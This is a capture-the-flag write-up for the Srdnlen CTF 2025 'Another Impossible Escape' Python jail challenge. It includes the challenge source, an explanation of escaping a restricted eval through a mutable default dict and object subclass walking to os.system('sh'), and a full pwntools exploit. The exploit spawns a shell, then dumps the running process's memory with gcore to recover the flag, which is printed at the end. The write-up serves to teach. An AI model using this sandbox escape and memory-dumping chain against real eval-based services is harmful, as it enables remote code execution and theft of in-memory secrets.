# Another Impossible Escape

**CTF:** Srdnlen CTF 2025

**Category:** Misc / PyJail

**Difficulty:** Hard

**Solves:** 17

**Author:** [@uNickz](https://github.com/uNickz) (Nicholas Meli)

---

## Description

> This year, the Impossible Escape is back! But this time, it's in a limited edition!
> 
> This is a remote challenge, you can connect to the service with: `nc aie.challs.srdnlen.it 3434`

---

## Overview

<details>
<summary>Challenge Source Code</summary>

```py
#!/usr/bin/env python3
import sys
import re

BANNER = r"""
############################################################
#       _                _   _                             #
#      / \   _ __   ___ | |_| |__   ___ _ __               #
#     / _ \ | '_ \ / _ \| __| '_ \ / _ \ '__|              #
#    / ___ \| | | | (_) | |_| | | |  __/ |                 #
#   /_/   \_\_| |_|\___/ \__|_| |_|\___|_|                 #
#      ___                               _ _     _         #
#     |_ _|_ __ ___  _ __   ___  ___ ___(_) |__ | | ___    #
#      | || '_ ` _ \| '_ \ / _ \/ __/ __| | '_ \| |/ _ \   #
#      | || | | | | | |_) | (_) \__ \__ \ | |_) | |  __/   #
#     |___|_| |_| |_| .__/ \___/|___/___/_|_.__/|_|\___|   #
#    _____          |_|                                    #
#   | ____|___  ___ __ _ _ __   ___                        #
#   |  _| / __|/ __/ _` | '_ \ / _ \                       #
#   | |___\__ \ (_| (_| | |_) |  __/   (Author: @uNickz)   #
#   |_____|___/\___\__,_| .__/ \___|                       #
#                       |_|                                #
#                                                          #
############################################################
""" 

FLAG = "srdnlen{Wh4t?_DuMp1nG_S0uRc3_C0d3_Fr0m_RuNn1nG_Pr0c3sS}"
del FLAG

class IE:
    def __init__(self) -> None:
        print(BANNER)
        print("Welcome to an other Impossible Escape!")
        print("This time in a limited edition! More information here:", sys.version)

        self.try_escape()
        return

    def code_sanitizer(self, dirty_code: str) -> str:
        if len(dirty_code) > 60:
            print("Code is too long. Exiting.")
            exit()

        if not dirty_code.isascii():
            print("Alien material detected... Exiting.")
            exit()

        banned_letters = ["m", "w", "f", "q", "y", "h", "p", "v", "z", "r", "x", "k"]
        banned_symbols = [" ", "@", "`", "'", "-", "+", "\\", '"', "*"]
        banned_words = ["input", "self", "os", "try_escape", "eval", "breakpoint", "flag", "system", "sys", "escape_plan", "exec"]

        if any(map(lambda c: c in dirty_code, banned_letters + banned_symbols + banned_words)):
            print("Are you trying to cheat me!? Emergency exit in progress.")
            exit()
        
        limited_items = {
            ".": 1,
            "=": 1,
            "(": 1,
            "_": 4,
        }

        for item, limit in limited_items.items():
            if dirty_code.count(item) > limit:
                print("You are trying to break the limits. Exiting.")
                exit()

        cool_code = dirty_code.replace("\\t", "\t").replace("\\n", "\n")
        return cool_code
    
    def escape_plan(self, gadgets: dict = {}) -> None:
        self.code = self.code_sanitizer(input("Submit your BEST Escape Plan: ").lower())
        return eval(self.code, {"__builtins__": {}}, gadgets)
        
    def try_escape(self) -> None:
        tries = max(1, min(7, int(input("How many tries do you need to escape? "))))

        for _ in range(tries):
            self.escape_plan()

        return

if __name__ == "__main__":
    with open(__file__, "r") as file_read:
        file_data = re.sub(r"srdnlen{.+}", "srdnlen{REDATTO}", file_read.read(), 1)

    with open(__file__, "w") as file_write:
        file_write.write(file_data)
    
    IE()
```
</details>
<br />

The first observation in this challenge is that the flag is initially defined as a global variable in the source code. However, it is immediately removed both from the runtime environment and the file on disk. As a result, it cannot be accessed simply by reading the file.

The program allows you to send between `1` and `7` "escape plans" (payloads), which are executed using the `eval` function.

### Input Restrictions

Before execution, the submitted code undergoes sanitization to prevent:
- The use of non-ASCII characters
- The use of dangerous keywords
- The presence of unauthorized symbols

Additional restrictions include:
- A maximum length of `60` characters
- No more than 1 dot (`.`)
- No more than 1 equal sign (`=`)
- No more than 1 opening parenthesis (`(`)
- No more than 4 underscores (`_`)

---

## Exploitation

The exploit consists of two main stages:
1. **Obtaining a shell**
2. **Retrieving the flag**

### 1. Obtaining a Shell

By analyzing the `escape_plan` function, we observe that the payload is executed via `eval` with an empty global environment and a `gadgets` dictionary as the local environment:

```python
def escape_plan(self, gadgets: dict = {}) -> None:
    self.code = self.code_sanitizer(input("Submit your BEST Escape Plan: ").lower())
    return eval(self.code, {"__builtins__": {}}, gadgets)
```

Although the `gadgets` dictionary appears to be empty initially, in Python, default arguments in functions are mutable objects shared across successive calls. This behavior allows us to modify the `gadgets` dictionary during one call and reuse it in subsequent iterations.

We exploit this characteristic to progressively build a persistent context in which we can carry out an attack. Our goal is to execute the following payload to open a shell:

```py
().__class__.__base__.__subclasses__()[155].__init__.__globals__["system"]("sh")
```

#### Payload Analysis

1. `()`: Creates an empty tuple.
2. `.__class__`: Accesses the class of the `tuple` object.
3. `.__base__`: Navigates to the superclass of `tuple`, which is `object`.
4. `.__subclasses__()`: Retrieves a list of all subclasses of `object`.
5. `[155]`: Selects the desired subclass. In many Python environments, this corresponds to the `os._wrap_close` class.
6. `.__init__.__globals__`: Accesses the global references of the `__init__` method of the selected class.
7. `["system"]("sh")`: Executes a system command, opening a shell.

### 2. Retrieving the Flag

Once we have a shell, we can attempt to recover the flag by dumping the process's heap memory. A common strategy involves using `gdb` and `gcore` to perform a memory dump and analyze it later.

A 2017 article titled "[How to recover lost Python source code if it's still resident in-memory](https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12?permalink_comment_id=2024943#gistcomment-2024943)" describes this technique in detail.

---

## Solution

### 1. Building the Payload

To bypass input restrictions, the payload is constructed step by step, leveraging the `gadgets` dictionary to store intermediate variables:

1. `[a := ().__class__ ]` &rarr; `a = <class 'tuple'>`
2. `[a := a.__base__ ]` &rarr; `a = <class 'object'>`
3. `[a := a.__subclasses__()[41:156:114] ]` &rarr; `a = [<class 'list'>, <class 'os._wrap_close'>]` 
4. `[a := [a[0], a[1].__init__] ]` &rarr; `a = [<class 'list'>, <function _wrap_close.__init__ at 0x7f003e1e7100>]`
5. `[a := [a[1], a[0](a[1].__globals__)] ]` &rarr; `a = [<function _wrap_close.__init__ at 0x7f82bab27100>, list(os._wrap_close.__init__.__globals__)]`
6. `a[0].__globals__[a[1][46]](a[1][57][:3:2])` &rarr; `os._wrap_close.__init__.__globals__["system"]("sh")`
    - `a[1][46]` is the string `"system"`
    - `a[1][57]` is the string `"sched_get_priority_max"`, and `a[1][57][:3:2]` is the string `"sh"`

### 2. Memory Dump

1. Identify the process's PID:
    - Retrieve the username with `whoami`.
    - Find the process PID with `grep -l './chall.py' /proc/[0-9]*/cmdline`.

2. Perform a memory dump with `gcore <PID>`.
3. Extract the flag from the dump using `cat core.* | grep -a -e 'srdnlen{.*}'`.

### Exploit

```py
#!/usr/bin/env python3

import time

from pwn import *

io = remote("aie.challs.srdnlen.it", 3434)

payloads = [
    "[a:=().__class__]", # <class 'tuple'>
    "[a:=a.__base__]", # <class 'object'>
    "[a:=a.__subclasses__()[41:156:114]]", # [<class 'list'>, <class 'os._wrap_close'>]
    "[a:=[a[0],a[1].__init__]]", # [<class 'list'>, <function _wrap_close.__init__ at 0x7f003e1e7100>]
    "[a:=[a[1],a[0](a[1].__globals__)]]", # [<function _wrap_close.__init__ at 0x7f82bab27100>, list(os._wrap_close.__init__.__globals__)]
    "a[0].__globals__[a[1][46]](a[1][57][:3:2])", # os._wrap_close.__init__.__globals__["system"]("sh")
]

io.sendlineafter(b"How many tries do you need to escape? ", str(len(payloads)).encode())

for payload in payloads:
    io.sendlineafter(b"Submit your BEST Escape Plan: ", payload.encode())

time.sleep(0.5) # wait for the shell to spawn

# find the name of the user running the challenge
io.sendline(b"whoami")
user = io.recvline().strip().decode()

# find the PID of the process running the challenge
io.sendline(b"grep -l './chall.py' /proc/[0-9]*/cmdline")
procs = io.recvrepeat(0.5).strip().decode().splitlines()

pid = None
for p in procs:
    io.sendline(f"cat {p}".encode())
    file_data = io.recvrepeat(0.5).strip().decode()
    if user in file_data:
        pid = int(p.split("/")[2])+1
        break

assert pid is not None

# dump the memory of the process
io.sendline(f"gcore {pid}".encode())

time.sleep(0.5) # wait for the memory dump to be created

# extract the flag from the memory dump
io.sendline(b"cat core.* | grep -a -o -e 'srdnlen{.*}'")

flag = max(io.recvrepeat(0.5).strip().decode().splitlines())
print(flag)

io.close()
```

## Flag

```
srdnlen{Wh4t?_DuMp1nG_S0uRc3_C0d3_Fr0m_RuNn1nG_Pr0c3sS}
```